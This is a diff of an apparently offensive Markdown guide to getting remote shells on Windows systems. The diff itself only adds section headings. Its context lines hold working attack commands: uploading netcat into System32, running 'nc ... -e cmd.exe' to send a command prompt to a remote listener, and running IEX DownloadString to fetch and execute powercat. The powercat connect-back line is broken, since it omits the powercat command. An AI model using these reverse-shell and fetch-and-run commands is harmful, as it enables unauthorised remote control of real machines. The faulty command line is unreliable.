@@ -175,6 +175,7 @@ Bind Shell (The other kind):
 
 For this section, we assume you can obtain a shell / command prompt equivalent connection from your system to the Windows remote system. This can be potentially achieved using the Meterpreter tool as outlined [here](https://www.offensive-security.com/metasploit-unleashed/persistent-netcat-backdoor/).
 
+<u>A possible method </u>
 We first need to upload the [Windows netcat](https://eternallybored.org/misc/netcat/).
 ```
 upload /path/to/nc.exe C:\Windows\System32
@@ -203,6 +204,7 @@ Finally, we can execute netcat on Windows which gives us a command prompt (Suppo
 nc 123.45.67.89 9191 -e cmd.exe
 ```
 
+<u>Powershell</u>
 If you prefer alternatives, you can use [powercat](https://github.com/besimorhino/powercat), which is essentially a Powershell version of netcat. To install it in Windows:
 ```powershell
 IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
@@ -213,6 +215,8 @@ Instead, of netcat, you kind now connect back to the same listening `nc` instanc
 powershell -c 123.45.67.89 -p 9191 -ep
 ```
 Note: use `-ep` for powershell, `-e cmd` for command prompt
+
+<u>Telnet</u>
 
 Under very obscure situations, you may consider trying telnet despite the need for administrator privileges. To enable it on newer systems (e.g. Windows 10):
 ```bat
